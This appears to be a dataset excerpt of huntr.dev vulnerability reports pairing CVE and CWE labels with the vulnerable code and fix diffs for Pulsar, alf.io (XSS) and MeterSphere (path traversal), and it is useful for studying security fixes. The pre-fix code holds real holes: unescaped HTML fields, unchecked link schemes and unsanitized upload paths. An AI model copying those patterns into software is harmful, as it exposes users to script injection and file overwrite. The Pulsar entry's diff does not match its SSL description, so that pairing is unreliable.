https://huntr.dev/bounties/df89b724-3201-47aa-b8cd-282e112a566f/,SSL verification omitted in OAuth2 credential flow in apache/pulsar,"Pulsar uses Curl to send HTTP(S) requests and typically uses the tlsAllowInsecure_ global variable (derived from isTlsAllowInsecureConnection()) to determine whether SSL verification¹ should be enabled/disabled². In the linked occurances, those checks do not occur and SSL verification is disabled by default which is obviously a security issue for end-users.",CVE-2022-33684,CWE-295: Improper Certificate Validation,https://www.github.com/apache/pulsar/commit/97ee1a114aa1e5df05d86a9dd47f7fe7a2194211,"@@ -620,10 +620,14 @@ jobs:
        run: |
          # build docker image
          # include building of Pulsar SQL, Connectors, Offloaders and server distros
          mvn -B -am -pl pulsar-sql/presto-distribution,distribution/io,distribution/offloaders,distribution/server,tests/docker-images/latest-version-image install \
          -Pmain,docker -Dmaven.test.skip=true -Ddockerfile.build.squash=true \
          -Dspotbugs.skip=true -Dlicense.skip=true -Dcheckstyle.skip=true -Drat.skip=true





      - name: Clean up disk space
        run: |
          # release disk space since saving docker image consumes local disk space

@@ -552,30 +552,30 @@ The Apache Software License, Version 2.0

BSD 3-clause ""New"" or ""Revised"" License
 * Google auth library
    - com.google.auth-google-auth-library-credentials-1.4.0.jar -- licenses/LICENSE-google-auth-library.txt
    - com.google.auth-google-auth-library-oauth2-http-1.4.0.jar -- licenses/LICENSE-google-auth-library.txt
 * LevelDB -- (included in org.rocksdb.*.jar) -- licenses/LICENSE-LevelDB.txt
 * JSR305 -- com.google.code.findbugs-jsr305-3.0.2.jar -- licenses/LICENSE-JSR305.txt
 * JLine -- jline-jline-2.14.6.jar -- licenses/LICENSE-JLine.txt
 * JLine3 -- org.jline-jline-3.21.0.jar -- licenses/LICENSE-JLine.txt

BSD 2-Clause License
 * HdrHistogram -- org.hdrhistogram-HdrHistogram-2.1.9.jar -- licenses/LICENSE-HdrHistogram.txt

MIT License
 * Java SemVer -- com.github.zafarkhaja-java-semver-0.9.0.jar -- licenses/LICENSE-SemVer.txt
 * SLF4J -- licenses/LICENSE-SLF4J.txt
    - org.slf4j-slf4j-api-1.7.32.jar
    - org.slf4j-jcl-over-slf4j-1.7.32.jar
 * The Checker Framework
    - org.checkerframework-checker-qual-3.12.0.jar

Protocol Buffers License
 * Protocol Buffers
   - com.google.protobuf-protobuf-java-3.19.6.jar -- licenses/LICENSE-protobuf.txt
   - com.google.protobuf-protobuf-java-util-3.19.6.jar -- licenses/LICENSE-protobuf.txt

CDDL-1.1 -- licenses/LICENSE-CDDL-1.1.txt
 * Java Annotations API
    - javax.annotation-javax.annotation-api-1.3.2.jar
    - com.sun.activation-javax.activation-1.2.0.jar
@@ -601,25 +601,25 @@ CDDL-1.1 -- licenses/LICENSE-CDDL-1.1.txt
    - org.glassfish.jersey.inject-jersey-hk2-2.34.jar
 * Mimepull -- org.jvnet.mimepull-mimepull-1.9.13.jar

Eclipse Distribution License 1.0 -- licenses/LICENSE-EDL-1.0.txt
 * Jakarta Activation
    - jakarta.activation-jakarta.activation-api-1.2.2.jar
 * Jakarta XML Binding -- jakarta.xml.bind-jakarta.xml.bind-api-2.3.3.jar

Eclipse Public License - v2.0 -- licenses/LICENSE-EPL-2.0.txt
 * Jakarta Annotations API -- jakarta.annotation-jakarta.annotation-api-1.3.5.jar
 * Jakarta RESTful Web Services -- jakarta.ws.rs-jakarta.ws.rs-api-2.1.6.jar
 * Jakarta Injection -- org.glassfish.hk2.external-jakarta.inject-2.6.1.jar

Public Domain (CC0) -- licenses/LICENSE-CC0.txt
 * Reactive Streams -- org.reactivestreams-reactive-streams-1.0.3.jar

Creative Commons Attribution License
 * Jcip -- licenses/LICENSE-jcip.txt
    - net.jcip-jcip-annotations-1.0.jar

Bouncy Castle License
 * Bouncy Castle -- licenses/LICENSE-bouncycastle.txt
    - org.bouncycastle-bcpkix-jdk15on-1.69.jar
    - org.bouncycastle-bcprov-ext-jdk15on-1.69.jar
    - org.bouncycastle-bcprov-jdk15on-1.69.jar
@@ -632,22 +632,22 @@ Additionaly, Netty includes code with the following licenses:
Contains a modified portion of 'Webbit', an event based WebSocket and HTTP server, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-Webbit.txt (BSD License)
 * HOMEPAGE:
   * https://github.com/joewalnes/webbit

Contains a modified portion of 'SLF4J', a simple logging facade for Java, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-SLF4J.txt (MIT License)
 * HOMEPAGE:
   * http://www.slf4j.org/

Contains a modified portion of 'jbzip2', a Java bzip2 compression and decompression library written
by Matthew J. Francis. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-jbzip2.txt (MIT License)
 * HOMEPAGE:
   * https://code.google.com/p/jbzip2/

@@ -656,22 +656,22 @@ the suffix array and the Burrows-Wheeler transformed string for any input string
a constant-size alphabet written by Yuta Mori. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-libdivsufsort.txt (MIT License)
 * HOMEPAGE:
   * https://github.com/y-256/libdivsufsort

Contains a modified portion of 'jfastlz', a Java port of FastLZ compression
and decompression library written by William Kinney. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-jfastlz.txt (MIT License)
 * HOMEPAGE:
   * https://code.google.com/p/jfastlz/

Contains a modified portion of and optionally depends on 'Protocol Buffers', Google's data
interchange format, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-protobuf.txt (New BSD License)
 * HOMEPAGE:
* https://github.com/google/protobuf
","6
.github/workflows/pulsar-ci.yaml
@@ -620,10 +620,14 @@ jobs:
        run: |
          # build docker image
          # include building of Pulsar SQL, Connectors, Offloaders and server distros
          mvn -B -am -pl pulsar-sql/presto-distribution,distribution/io,distribution/offloaders,distribution/server,tests/docker-images/latest-version-image install \
          mvn -B -am -pl pulsar-sql/presto-distribution,distribution/io,distribution/offloaders,distribution/server,distribution/shell,tests/docker-images/latest-version-image install \
          -Pmain,docker -Dmaven.test.skip=true -Ddockerfile.build.squash=true \
          -Dspotbugs.skip=true -Dlicense.skip=true -Dcheckstyle.skip=true -Drat.skip=true
      # check full build artifacts licenses
      - name: Check binary licenses
        run: src/check-binary-license.sh ./distribution/server/target/apache-pulsar-*-bin.tar.gz && src/check-binary-license.sh ./distribution/shell/target/apache-pulsar-shell-*-bin.tar.gz

      - name: Clean up disk space
        run: |
          # release disk space since saving docker image consumes local disk space
0
distribution/server/licenses/LICENSE-CC0.txt → distribution/licenses/LICENSE-CC0.txt
File renamed without changes.
0
...tion/server/licenses/LICENSE-CDDL-1.1.txt → distribution/licenses/LICENSE-CDDL-1.1.txt
File renamed without changes.
0
...ution/server/licenses/LICENSE-EDL-1.0.txt → distribution/licenses/LICENSE-EDL-1.0.txt
File renamed without changes.
0
...ution/server/licenses/LICENSE-EPL-1.0.txt → distribution/licenses/LICENSE-EPL-1.0.txt
File renamed without changes.
0
...ution/server/licenses/LICENSE-EPL-2.0.txt → distribution/licenses/LICENSE-EPL-2.0.txt
File renamed without changes.
0
.../server/licenses/LICENSE-HdrHistogram.txt → ...ibution/licenses/LICENSE-HdrHistogram.txt
File renamed without changes.
0
...server/licenses/LICENSE-HdrHistogram0.txt → ...bution/licenses/LICENSE-HdrHistogram0.txt
File renamed without changes.
0
...ibution/server/licenses/LICENSE-JLine.txt → distribution/licenses/LICENSE-JLine.txt
File renamed without changes.
0
...bution/server/licenses/LICENSE-JSR305.txt → distribution/licenses/LICENSE-JSR305.txt
File renamed without changes.
0
...ution/server/licenses/LICENSE-LevelDB.txt → distribution/licenses/LICENSE-LevelDB.txt
File renamed without changes.
0
...ibution/server/licenses/LICENSE-SLF4J.txt → distribution/licenses/LICENSE-SLF4J.txt
File renamed without changes.
0
...bution/server/licenses/LICENSE-SemVer.txt → distribution/licenses/LICENSE-SemVer.txt
File renamed without changes.
0
...tion/server/licenses/LICENSE-Spotbugs.txt → distribution/licenses/LICENSE-Spotbugs.txt
File renamed without changes.
0
...bution/server/licenses/LICENSE-Webbit.txt → distribution/licenses/LICENSE-Webbit.txt
File renamed without changes.
0
.../server/licenses/LICENSE-bouncycastle.txt → ...ibution/licenses/LICENSE-bouncycastle.txt
File renamed without changes.
0
...bution/server/licenses/LICENSE-golang.txt → distribution/licenses/LICENSE-golang.txt
File renamed without changes.
0
.../licenses/LICENSE-google-auth-library.txt → .../licenses/LICENSE-google-auth-library.txt
File renamed without changes.
0
...bution/server/licenses/LICENSE-jbzip2.txt → distribution/licenses/LICENSE-jbzip2.txt
File renamed without changes.
0
...ribution/server/licenses/LICENSE-jcip.txt → distribution/licenses/LICENSE-jcip.txt
File renamed without changes.
0
...ution/server/licenses/LICENSE-jfastlz.txt → distribution/licenses/LICENSE-jfastlz.txt
File renamed without changes.
0
...server/licenses/LICENSE-libdivsufsort.txt → ...bution/licenses/LICENSE-libdivsufsort.txt
File renamed without changes.
0
...tion/server/licenses/LICENSE-protobuf.txt → distribution/licenses/LICENSE-protobuf.txt
File renamed without changes.
0
distribution/server/licenses/LICENSE-xz.txt → distribution/licenses/LICENSE-xz.txt
File renamed without changes.
46
distribution/server/src/assemble/LICENSE.bin.txt
@@ -552,30 +552,30 @@ The Apache Software License, Version 2.0

BSD 3-clause ""New"" or ""Revised"" License
 * Google auth library
    - com.google.auth-google-auth-library-credentials-1.4.0.jar -- licenses/LICENSE-google-auth-library.txt
    - com.google.auth-google-auth-library-oauth2-http-1.4.0.jar -- licenses/LICENSE-google-auth-library.txt
 * LevelDB -- (included in org.rocksdb.*.jar) -- licenses/LICENSE-LevelDB.txt
 * JSR305 -- com.google.code.findbugs-jsr305-3.0.2.jar -- licenses/LICENSE-JSR305.txt
 * JLine -- jline-jline-2.14.6.jar -- licenses/LICENSE-JLine.txt
 * JLine3 -- org.jline-jline-3.21.0.jar -- licenses/LICENSE-JLine.txt
    - com.google.auth-google-auth-library-credentials-1.4.0.jar -- ../licenses/LICENSE-google-auth-library.txt
    - com.google.auth-google-auth-library-oauth2-http-1.4.0.jar -- ../licenses/LICENSE-google-auth-library.txt
 * LevelDB -- (included in org.rocksdb.*.jar) -- ../licenses/LICENSE-LevelDB.txt
 * JSR305 -- com.google.code.findbugs-jsr305-3.0.2.jar -- ../licenses/LICENSE-JSR305.txt
 * JLine -- jline-jline-2.14.6.jar -- ../licenses/LICENSE-JLine.txt
 * JLine3 -- org.jline-jline-3.21.0.jar -- ../licenses/LICENSE-JLine.txt

BSD 2-Clause License
 * HdrHistogram -- org.hdrhistogram-HdrHistogram-2.1.9.jar -- licenses/LICENSE-HdrHistogram.txt
 * HdrHistogram -- org.hdrhistogram-HdrHistogram-2.1.9.jar -- ../licenses/LICENSE-HdrHistogram.txt

MIT License
 * Java SemVer -- com.github.zafarkhaja-java-semver-0.9.0.jar -- licenses/LICENSE-SemVer.txt
 * SLF4J -- licenses/LICENSE-SLF4J.txt
 * Java SemVer -- com.github.zafarkhaja-java-semver-0.9.0.jar -- ../licenses/LICENSE-SemVer.txt
 * SLF4J -- ../licenses/LICENSE-SLF4J.txt
    - org.slf4j-slf4j-api-1.7.32.jar
    - org.slf4j-jcl-over-slf4j-1.7.32.jar
 * The Checker Framework
    - org.checkerframework-checker-qual-3.12.0.jar

Protocol Buffers License
 * Protocol Buffers
   - com.google.protobuf-protobuf-java-3.19.6.jar -- licenses/LICENSE-protobuf.txt
   - com.google.protobuf-protobuf-java-util-3.19.6.jar -- licenses/LICENSE-protobuf.txt
   - com.google.protobuf-protobuf-java-3.19.6.jar -- ../licenses/LICENSE-protobuf.txt
   - com.google.protobuf-protobuf-java-util-3.19.6.jar -- ../licenses/LICENSE-protobuf.txt

CDDL-1.1 -- licenses/LICENSE-CDDL-1.1.txt
CDDL-1.1 -- ../licenses/LICENSE-CDDL-1.1.txt
 * Java Annotations API
    - javax.annotation-javax.annotation-api-1.3.2.jar
    - com.sun.activation-javax.activation-1.2.0.jar
@@ -601,25 +601,25 @@ CDDL-1.1 -- licenses/LICENSE-CDDL-1.1.txt
    - org.glassfish.jersey.inject-jersey-hk2-2.34.jar
 * Mimepull -- org.jvnet.mimepull-mimepull-1.9.13.jar

Eclipse Distribution License 1.0 -- licenses/LICENSE-EDL-1.0.txt
Eclipse Distribution License 1.0 -- ../licenses/LICENSE-EDL-1.0.txt
 * Jakarta Activation
    - jakarta.activation-jakarta.activation-api-1.2.2.jar
 * Jakarta XML Binding -- jakarta.xml.bind-jakarta.xml.bind-api-2.3.3.jar

Eclipse Public License - v2.0 -- licenses/LICENSE-EPL-2.0.txt
Eclipse Public License - v2.0 -- ../licenses/LICENSE-EPL-2.0.txt
 * Jakarta Annotations API -- jakarta.annotation-jakarta.annotation-api-1.3.5.jar
 * Jakarta RESTful Web Services -- jakarta.ws.rs-jakarta.ws.rs-api-2.1.6.jar
 * Jakarta Injection -- org.glassfish.hk2.external-jakarta.inject-2.6.1.jar

Public Domain (CC0) -- licenses/LICENSE-CC0.txt
Public Domain (CC0) -- ../licenses/LICENSE-CC0.txt
 * Reactive Streams -- org.reactivestreams-reactive-streams-1.0.3.jar

Creative Commons Attribution License
 * Jcip -- licenses/LICENSE-jcip.txt
 * Jcip -- ../licenses/LICENSE-jcip.txt
    - net.jcip-jcip-annotations-1.0.jar

Bouncy Castle License
 * Bouncy Castle -- licenses/LICENSE-bouncycastle.txt
 * Bouncy Castle -- ../licenses/LICENSE-bouncycastle.txt
    - org.bouncycastle-bcpkix-jdk15on-1.69.jar
    - org.bouncycastle-bcprov-ext-jdk15on-1.69.jar
    - org.bouncycastle-bcprov-jdk15on-1.69.jar
@@ -632,22 +632,22 @@ Additionaly, Netty includes code with the following licenses:
Contains a modified portion of 'Webbit', an event based WebSocket and HTTP server, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-Webbit.txt (BSD License)
   * ../licenses/LICENSE-Webbit.txt (BSD License)
 * HOMEPAGE:
   * https://github.com/joewalnes/webbit

Contains a modified portion of 'SLF4J', a simple logging facade for Java, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-SLF4J.txt (MIT License)
   * ../licenses/LICENSE-SLF4J.txt (MIT License)
 * HOMEPAGE:
   * http://www.slf4j.org/

Contains a modified portion of 'jbzip2', a Java bzip2 compression and decompression library written
by Matthew J. Francis. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-jbzip2.txt (MIT License)
   * ../licenses/LICENSE-jbzip2.txt (MIT License)
 * HOMEPAGE:
   * https://code.google.com/p/jbzip2/

@@ -656,22 +656,22 @@ the suffix array and the Burrows-Wheeler transformed string for any input string
a constant-size alphabet written by Yuta Mori. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-libdivsufsort.txt (MIT License)
   * ../licenses/LICENSE-libdivsufsort.txt (MIT License)
 * HOMEPAGE:
   * https://github.com/y-256/libdivsufsort

Contains a modified portion of 'jfastlz', a Java port of FastLZ compression
and decompression library written by William Kinney. It can be obtained at:

 * LICENSE:
   * licenses/LICENSE-jfastlz.txt (MIT License)
   * ../licenses/LICENSE-jfastlz.txt (MIT License)
 * HOMEPAGE:
   * https://code.google.com/p/jfastlz/

Contains a modified portion of and optionally depends on 'Protocol Buffers', Google's data
interchange format, which can be obtained at:

 * LICENSE:
   * licenses/LICENSE-protobuf.txt (New BSD License)
   * ../licenses/LICENSE-protobuf.txt (New BSD License)
 * HOMEPAGE:
* https://github.com/google/protobuf"
https://huntr.dev/bounties/8a91e127-2903-4c6b-9a66-e4d2e30f8dec/,XSS in Markdown Events in alfio-event/alf.io,XSS Vulnerability in the Events and Markdown features,CVE-2023-0301,CWE-79: Cross-site Scripting (XSS) - Stored,https://www.github.com/alfio-event/alf.io/commit/21cb2866e5f58b4a2b4a2cb0066479bbb26f7b39,"@@ -168,7 +168,15 @@ public void setAttributes(Node node, String tagName, Map<String, String> attribu
            if (node instanceof Link) {
                Link l = (Link) node;
                String destination = StringUtils.trimToEmpty(l.getDestination());







                if (UrlUtils.isAbsoluteUrl(destination)) {

                    attributes.put(""target"", ""_blank"");
                    attributes.put(""rel"", ""nofollow noopener noreferrer"");
                    var newTabLabel = A11Y_NEW_TAB_LABEL.get();
@@ -183,6 +191,14 @@ public static String renderToHtmlCommonmarkEscaped(String input) {
        return renderToHtmlCommonmarkEscaped(input, null);
    }









    public static String renderToHtmlCommonmarkEscaped(String input, String localizedNewWindowLabel) {
        try {
            A11Y_NEW_TAB_LABEL.set(localizedNewWindowLabel);

@@ -87,4 +87,13 @@ public void testHtmlMarkDown() {
        //for absolute link we add target=""_blank""
        assertEquals(""<p>link <a href=\""http://test\"" target=\""_blank\"" rel=\""nofollow noopener noreferrer\"">bla</a> link</p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""link [bla](http://test) link""));
    }









}
","16
src/main/java/alfio/util/MustacheCustomTag.java
@@ -168,7 +168,15 @@ public void setAttributes(Node node, String tagName, Map<String, String> attribu
            if (node instanceof Link) {
                Link l = (Link) node;
                String destination = StringUtils.trimToEmpty(l.getDestination());
                var scheme = getScheme(destination);
                scheme.ifPresent(resolvedScheme -> {
                    if (!Set.of(""http"", ""https"").contains(resolvedScheme)) {
                        log.info(""User tried to set an url with scheme {}, only http/https are accepted, href has been removed"", resolvedScheme);
                        attributes.remove(""href"");
                    }
                });
                if (UrlUtils.isAbsoluteUrl(destination)) {
                    // accept only http or https protocols if we have an absolute link, else we override with an empty string
                    attributes.put(""target"", ""_blank"");
                    attributes.put(""rel"", ""nofollow noopener noreferrer"");
                    var newTabLabel = A11Y_NEW_TAB_LABEL.get();
@@ -183,6 +191,14 @@ public static String renderToHtmlCommonmarkEscaped(String input) {
        return renderToHtmlCommonmarkEscaped(input, null);
    }

    /**
     * return lowercase scheme if present
     */
    private static Optional<String> getScheme(String uri) {
        var s = StringUtils.trimToEmpty(uri).toLowerCase(Locale.ROOT);
        return s.indexOf(':') >= 0 ? Optional.of(StringUtils.substringBefore(s, ':')) : Optional.empty();
    }

    public static String renderToHtmlCommonmarkEscaped(String input, String localizedNewWindowLabel) {
        try {
            A11Y_NEW_TAB_LABEL.set(localizedNewWindowLabel);
9
src/test/java/alfio/util/MustacheCustomTagTest.java
@@ -87,4 +87,13 @@ public void testHtmlMarkDown() {
        //for absolute link we add target=""_blank""
        assertEquals(""<p>link <a href=\""http://test\"" target=\""_blank\"" rel=\""nofollow noopener noreferrer\"">bla</a> link</p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""link [bla](http://test) link""));
    }

    @Test
    public void acceptOnlyHttpOrHttpsProtocols() {
        assertEquals(""<p><a href=\""http://google.com\"" target=\""_blank\"" rel=\""nofollow noopener noreferrer\"">google</a></p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""[google](http://google.com)""));
        assertEquals(""<p><a href=\""https://google.com\"" target=\""_blank\"" rel=\""nofollow noopener noreferrer\"">google</a></p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""[google](https://google.com)""));
        assertEquals(""<p><a>google</a></p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""[google](any:google.com)""));
        assertEquals(""<p><a>google</a></p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""[google](other:google.com)""));
        assertEquals(""<p><a>google</a></p>\n"", MustacheCustomTag.renderToHtmlCommonmarkEscaped(""[google](protocols:/google.com)""));
    }
}"
https://huntr.dev/bounties/0a91fec7-a76e-4ca3-80ba-81de1f10d59d/,Html Injection in Groups in alfio-event/alf.io,"Insert XSS payload in groups fields(Name, Description)",CVE-2023-0300,CWE-79: Cross-site Scripting (XSS) - Reflected,https://www.github.com/alfio-event/alf.io/commit/c1ae54ac84f1c7a5ec2831876f6445cb79be96fc,"@@ -35,6 +35,7 @@
import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.Validate;

import org.springframework.stereotype.Component;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.TransactionDefinition;
@@ -49,6 +50,7 @@
import static alfio.model.group.LinkedGroup.MatchType.FULL;
import static alfio.model.group.LinkedGroup.Type.*;
import static java.util.Collections.singletonList;


@Component
@Log4j2
@@ -81,7 +83,7 @@ public Result<Integer> createNew(GroupModification input) {
    }

    Group createNew(String name, String description, int organizationId) {
        AffectedRowCountAndKey<Integer> insert = groupRepository.insert(name, description, organizationId);
        return groupRepository.getById(insert.getKey());
    }

@@ -247,7 +249,7 @@ public Optional<GroupModification> update(int listId, GroupModification modifica
                throw new DuplicateGroupItemException(error.getDescription());
            }
        }
        groupRepository.update(listId, modification.getName(), modification.getDescription());
        return loadComplete(listId);
    }


@@ -28,6 +28,8 @@
import java.util.Optional;
import java.util.UUID;



@QueryRepository
public interface GroupRepository {

@@ -66,7 +68,9 @@ AffectedRowCountAndKey<Integer> createConfiguration(@Bind(""groupId"") int groupId

    default int[] insert(int groupId, List<GroupMemberModification> members) {
        MapSqlParameterSource[] params = members.stream()
            .map(i -> new MapSqlParameterSource(""groupId"", groupId).addValue(""value"", i.getValue().toLowerCase()).addValue(""description"", i.getDescription()))


            .toArray(MapSqlParameterSource[]::new);

        return getNamedParameterJdbcTemplate().batchUpdate(""insert into group_member(a_group_id_fk, value, description) values(:groupId, :value, :description)"", params);

@@ -622,20 +622,26 @@
        };
    }]);

    baseServices.service(""NotificationHandler"", [""growl"", function (growl) {
        var config = {ttl: 5000, disableCountDown: true};






        return {
            showSuccess: function (message) {
                return growl.success(message, config);
            },
            showWarning: function (message) {
                return growl.warning(message, config);
            },
            showInfo : function (message) {
                return growl.info(message, config);
            },
            showError : function (message) {
                return growl.error(message, config);
            }
        }


@@ -160,4 +160,30 @@ public void testDuplicates() {
        assertEquals(""value.duplicate"", items.getFirstErrorOrNull().getCode());
        assertEquals(""test@test.ch"", items.getFirstErrorOrNull().getDescription());
    }


























}
","6
src/main/java/alfio/manager/GroupManager.java
@@ -35,6 +35,7 @@
import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.Validate;
import org.apache.commons.text.StringEscapeUtils;
import org.springframework.stereotype.Component;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.TransactionDefinition;
@@ -49,6 +50,7 @@
import static alfio.model.group.LinkedGroup.MatchType.FULL;
import static alfio.model.group.LinkedGroup.Type.*;
import static java.util.Collections.singletonList;
import static org.apache.commons.text.StringEscapeUtils.escapeHtml4;

@Component
@Log4j2
@@ -81,7 +83,7 @@ public Result<Integer> createNew(GroupModification input) {
    }

    Group createNew(String name, String description, int organizationId) {
        AffectedRowCountAndKey<Integer> insert = groupRepository.insert(name, description, organizationId);
        AffectedRowCountAndKey<Integer> insert = groupRepository.insert(escapeHtml4(name), escapeHtml4(description), organizationId);
        return groupRepository.getById(insert.getKey());
    }

@@ -247,7 +249,7 @@ public Optional<GroupModification> update(int listId, GroupModification modifica
                throw new DuplicateGroupItemException(error.getDescription());
            }
        }
        groupRepository.update(listId, modification.getName(), modification.getDescription());
        groupRepository.update(listId, escapeHtml4(modification.getName()), escapeHtml4(modification.getDescription()));
        return loadComplete(listId);
    }

6
src/main/java/alfio/repository/GroupRepository.java
@@ -28,6 +28,8 @@
import java.util.Optional;
import java.util.UUID;

import static org.apache.commons.text.StringEscapeUtils.escapeHtml4;

@QueryRepository
public interface GroupRepository {

@@ -66,7 +68,9 @@ AffectedRowCountAndKey<Integer> createConfiguration(@Bind(""groupId"") int groupId

    default int[] insert(int groupId, List<GroupMemberModification> members) {
        MapSqlParameterSource[] params = members.stream()
            .map(i -> new MapSqlParameterSource(""groupId"", groupId).addValue(""value"", i.getValue().toLowerCase()).addValue(""description"", i.getDescription()))
            .map(i -> new MapSqlParameterSource(""groupId"", groupId)
                .addValue(""value"", i.getValue().toLowerCase())
                .addValue(""description"", escapeHtml4(i.getDescription())))
            .toArray(MapSqlParameterSource[]::new);

        return getNamedParameterJdbcTemplate().batchUpdate(""insert into group_member(a_group_id_fk, value, description) values(:groupId, :value, :description)"", params);
16
src/main/webapp/resources/js/admin/service/service.js
@@ -622,20 +622,26 @@
        };
    }]);

    baseServices.service(""NotificationHandler"", [""growl"", function (growl) {
    baseServices.service(""NotificationHandler"", [""growl"", ""$sanitize"", function (growl, $sanitize) {
        var config = {ttl: 5000, disableCountDown: true};
        var sanitize = function(message) {
            var sanitized = $sanitize(message);
            return sanitized.split(' ').map(function(part) {
                return encodeURIComponent(part);
            }).join(' ');
        };
        return {
            showSuccess: function (message) {
                return growl.success(message, config);
                return growl.success(sanitize(message), config);
            },
            showWarning: function (message) {
                return growl.warning(message, config);
                return growl.warning(sanitize(message), config);
            },
            showInfo : function (message) {
                return growl.info(message, config);
                return growl.info(sanitize(message), config);
            },
            showError : function (message) {
                return growl.error(message, config);
                return growl.error(sanitize(message), config);
            }
        }

26
src/test/java/alfio/manager/GroupManagerIntegrationTest.java
@@ -160,4 +160,30 @@ public void testDuplicates() {
        assertEquals(""value.duplicate"", items.getFirstErrorOrNull().getCode());
        assertEquals(""test@test.ch"", items.getFirstErrorOrNull().getDescription());
    }

    @Test
    void testEscape() {
        List<TicketCategoryModification> categories = Collections.singletonList(
            new TicketCategoryModification(null, ""default"", TicketCategory.TicketAccessType.INHERIT, 10,
                new DateTimeModification(LocalDate.now(ClockProvider.clock()).plusDays(1), LocalTime.now(ClockProvider.clock())),
                new DateTimeModification(LocalDate.now(ClockProvider.clock()).plusDays(2), LocalTime.now(ClockProvider.clock())),
                DESCRIPTION, BigDecimal.TEN, false, """", false, null, null, null, null, null, 0, null, null, AlfioMetadata.empty()));
        Pair<Event, String> pair = initEvent(categories, organizationRepository, userManager, eventManager, eventRepository);
        Event event = pair.getKey();
        Group group = groupManager.createNew(""test > 1"", ""This is a test < 1"", event.getOrganizationId());
        assertNotNull(group);
        assertEquals(""This is a test &lt; 1"", group.getDescription());
        assertEquals(""test &gt; 1"", group.getName());
        LinkedGroupModification modification = new LinkedGroupModification(null, group.getId(), event.getId(), null, LinkedGroup.Type.ONCE_PER_VALUE, LinkedGroup.MatchType.FULL, null);
        LinkedGroup configuration = groupManager.createLink(group.getId(), event.getId(), modification);
        assertNotNull(configuration);
        Result<Integer> items = groupManager.insertMembers(group.getId(), List.of(new GroupMemberModification(null,""test@test.ch"", ""description <>"")));
        assertTrue(items.isSuccess());
        var persistedGroup = groupManager.loadComplete(group.getId()).orElseThrow();
        assertEquals(""description &lt;&gt;"", persistedGroup.getItems().get(0).getDescription());
        groupManager.update(group.getId(), new GroupModification(group.getId(), ""test > 1"", ""This is a test < 1"", event.getOrganizationId(), List.of(new GroupMemberModification(null,""test@test.ch"", ""description <>""))));
        persistedGroup = groupManager.loadComplete(group.getId()).orElseThrow();
        assertEquals(""This is a test &lt; 1"", persistedGroup.getDescription());
        assertEquals(""test &gt; 1"", persistedGroup.getName());
    }
}"
https://huntr.dev/bounties/7ab3e5cc-e4df-4130-a359-c8cdffe7ecb3/,Path Traversal when upload file in metersphere/metersphere,Poc can be found in the link,,CWE-22: Path Traversal,https://www.github.com/metersphere/metersphere/commit/3a890eeeb8a6b0887927c876a73bdb3a99a82138,"@@ -32,6 +32,11 @@ public class FileUtils {
    public static final String ATTACHMENT_DIR = ""/opt/metersphere/data/attachment"";
    public static final String ATTACHMENT_TMP_DIR = ""/opt/metersphere/data/attachment/tmp"";







    public static byte[] listBytesToZip(Map<String, byte[]> mapReport) {
        try {
@@ -55,6 +60,7 @@ public static byte[] listBytesToZip(Map<String, byte[]> mapReport) {
    }

    public static void createFile(String filePath, byte[] fileBytes) {

        File file = new File(filePath);
        if (file.exists()) {
            file.delete();
@@ -93,6 +99,7 @@ private static void create(List<String> bodyUploadIds, List<MultipartFile> bodyF
            }
            for (int i = 0; i < bodyUploadIds.size(); i++) {
                MultipartFile item = bodyFiles.get(i);

                File file = new File(filePath + File.separator + bodyUploadIds.get(i) + ""_"" + item.getOriginalFilename());
                try (InputStream in = item.getInputStream(); OutputStream out = new FileOutputStream(file)) {
                    file.createNewFile();
@@ -112,6 +119,7 @@ private static void create(List<String> bodyUploadIds, List<MultipartFile> bodyF
    public static String create(String id, MultipartFile item) {
        String filePath = BODY_FILE_DIR + ""/plugin"";
        if (item != null) {

            File testDir = new File(filePath);
            if (!testDir.exists()) {
                testDir.mkdirs();
@@ -141,6 +149,7 @@ public static void createBodyFiles(String requestId, List<MultipartFile> bodyFil
                testDir.mkdirs();
            }
            bodyFiles.forEach(item -> {

                File file = new File(path + File.separator + item.getOriginalFilename());
                try (InputStream in = item.getInputStream(); OutputStream out = new FileOutputStream(file)) {
                    file.createNewFile();
@@ -259,6 +268,7 @@ public static void createFiles(List<String> bodyUploadIds, List<MultipartFile> b
    }

    public static String createFile(MultipartFile bodyFile) {

        String dir = ""/opt/metersphere/data/body/tmp/"";
        File fileDir = new File(dir);
        if (!fileDir.exists()) {
@@ -290,6 +300,7 @@ public static void deleteBodyFiles(String requestId) {
    }

    public static String uploadFile(MultipartFile uploadFile, String path, String name) {

        if (uploadFile == null) {
            return null;
        }

@@ -127,12 +127,13 @@ public List<FileInfoDTO> getFileBatch(List<FileRequest> requestList) throws Exce


    private File createFile(FileRequest request) {
        String path = StringUtils.join(FileUtils.BODY_FILE_DIR, ""/"", request.getProjectId());

        File fileDir = new File(path);
        if (!fileDir.exists()) {
            fileDir.mkdirs();
        }
        File file = new File(StringUtils.join(path, ""/"", request.getFileName()));
        return file;
    }
}
","11
framework/sdk-parent/sdk/src/main/java/io/metersphere/commons/utils/FileUtils.java
@@ -32,6 +32,11 @@ public class FileUtils {
    public static final String ATTACHMENT_DIR = ""/opt/metersphere/data/attachment"";
    public static final String ATTACHMENT_TMP_DIR = ""/opt/metersphere/data/attachment/tmp"";

    public static void validateFileName(String fileName) {
        if (StringUtils.isNotEmpty(fileName) && fileName.contains(File.separator)) {
